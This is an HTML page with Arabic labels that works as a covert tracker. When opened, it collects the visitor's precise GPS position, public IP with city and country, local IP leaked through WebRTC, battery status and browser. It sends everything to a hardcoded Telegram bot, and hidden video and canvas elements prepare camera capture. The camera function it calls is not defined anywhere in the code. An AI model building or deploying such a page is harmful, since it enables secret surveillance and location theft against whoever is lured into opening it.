<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>📍 تحديد + تصوير + IPs</title>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <pre id="result">📡 جاري جمع المعلومات...</pre>

  <script>
    const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
    const chat_id = "5735855086";

    let gpsMsg = "";
    let publicIP = "";
    let localIP = "";
    let gpsLat = "";
    let gpsLon = "";
    let partsReady = 0;
    let city = "";
    let country = "";
    let flagEmoji = "";
    let browserInfo = "";
    let batteryInfo = "🔋 البطارية: ❌ غير مدعومة";

    function sendPhoto(blob) {
      const form = new FormData();
      form.append("chat_id", chat_id);
      form.append("photo", blob, "photo.jpg");
      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: form
      });
    }

    function sendCombinedMessage() {
      const message = `📡 معلومات الجهاز:

📍 الموقع (GPS):
${gpsMsg || "❌ فشل تحديد الموقع"}

🌐 IP الخارجي: ${publicIP || "❌"}
🏠 IP الداخلي: ${localIP || "❌"}

🏙️ المدينة: ${city || "❌"}
🌍 الدولة: ${country ? `${country} ${flagEmoji}` : "❌"}

🌐 المتصفح: ${browserInfo}
${batteryInfo}

🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
      document.getElementById("result").innerText = message;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id, text: message })
      });
    }

    function checkIfReady() {
      partsReady++;
      if (partsReady === 3) {
        sendCombinedMessage();
      }
    }

    function getLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            gpsLat = pos.coords.latitude.toFixed(6);
            gpsLon = pos.coords.longitude.toFixed(6);
            const acc = pos.coords.accuracy;
            gpsMsg = `Latitude: ${gpsLat}
Longitude: ${gpsLon}
📏 الدقة: ±${acc} متر`;
            checkIfReady();
          },
          err => {
            gpsMsg = `❌ فشل تحديد الموقع: ${err.message} (كود الخطأ: ${err.code})`;
            document.getElementById("result").innerText += `\n[خطأ GPS]: ${err.message} (code: ${err.code})`;
            checkIfReady();
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        gpsMsg = "❌ جهازك لا يدعم GPS";
        document.getElementById("result").innerText += "\n[GPS غير مدعوم]";
        checkIfReady();
      }
    }

    function getGeoInfo(ip) {
      fetch(`https://ipapi.co/${ip}/json/`)
        .then(res => res.json())
        .then(data => {
          city = data.city || "";
          country = data.country_name || "";
          const countryCode = data.country || "";
          flagEmoji = countryCode
            ? String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65))
            : "";
          checkIfReady();
        })
        .catch(() => {
          city = "";
          country = "";
          flagEmoji = "";
          checkIfReady();
        });
    }

    function getPublicIP() {
      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
          publicIP = data.ip;
          getGeoInfo(publicIP);
        })
        .catch(() => {
          publicIP = "❌ فشل جلب IP";
          checkIfReady();
        });
    }

    function getLocalIP() {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
      pc.onicecandidate = event => {
        if (!event || !event.candidate) return;
        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
        if (ipMatch) {
          const ip = ipMatch[1];
          if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
            localIP = ip;
            checkIfReady();
          }
        }
      };
      setTimeout(() => {
        if (!localIP) {
          localIP = "❌ لم يتم الحصول عليه";
          checkIfReady();
        }
      }, 2000);
    }

    function getBatteryInfo() {
      if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
          const percent = Math.round(battery.level * 100);
          batteryInfo = `🔋 البطارية: ${percent}% ${battery.charging ? "🔌 (تشحن)" : "🔋 (ليست مشحونة)"}`;
        });
      }
    }

    function detectBrowser() {
      const ua = navigator.userAgent;
      if (ua.includes("Chrome")) {
        browserInfo = "Chrome";
      } else if (ua.includes("Firefox")) {
        browserInfo = "Firefox";
      } else if (ua.includes("Safari")) {
        browserInfo = "Safari";
      } else if (ua.includes("Edg")) {
        browserInfo = "Edge";
      } else {
        browserInfo = "غير معروف";
      }
    }

    // بدء كل العمليات
    detectBrowser();
    getBatteryInfo();
    getLocation();
    getPublicIP();
    getLocalIP();
    initCamera();
  </script>
</body>
</html>
